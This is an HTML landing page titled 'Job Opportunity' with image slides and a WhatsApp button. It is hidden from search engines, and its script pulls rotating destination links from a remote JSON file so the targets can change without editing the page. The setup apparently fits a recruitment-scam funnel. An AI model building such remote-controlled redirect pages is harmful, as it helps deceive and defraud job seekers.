<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow">

<title>Job Opportunity</title>

<style>

body{
margin:0;
font-family:Arial;
background:#fff;
text-align:center;
}

.container{
max-width:700px;
margin:auto;
}

.container img{
width:100%;
display:block;
}

.btn{
position:fixed;
bottom:25px;
left:50%;
transform:translateX(-50%);
background:#25D366;
color:#fff;
font-size:18px;
padding:16px 30px;
border-radius:50px;
border:none;
cursor:pointer;
box-shadow:0 5px 15px rgba(0,0,0,0.2);
}

</style>
</head>

<body>

<div class="container">

<img src="img/1.jpg">
<img src="img/2.jpg">
<img src="img/3.jpg">

</div>

<button class="btn" id="jumpBtn">
Contact us on WhatsApp
</button>

<script>

(async ()=>{

const JSON_URL="https://liuhongliang11895.github.io/888/mapping.json";

let activeLinks=[];

try{

const res=await fetch(JSON_URL+"?t="+Date.now(),{cache:"no-store"});

const data=await res.json();

activeLinks=data.links.filter(l=>l.active);

}catch(e){

console.log("json error");

}

function getLink(){

if(activeLinks.length){

return activeLinks[Math.floor(Math.random()*activeLinks.length)].url;

}

return "https://google.com";

}

document.getElementById("jumpBtn").onclick=()=>{

location.href=getLink();

}

})();

</script>

</body>
</html>
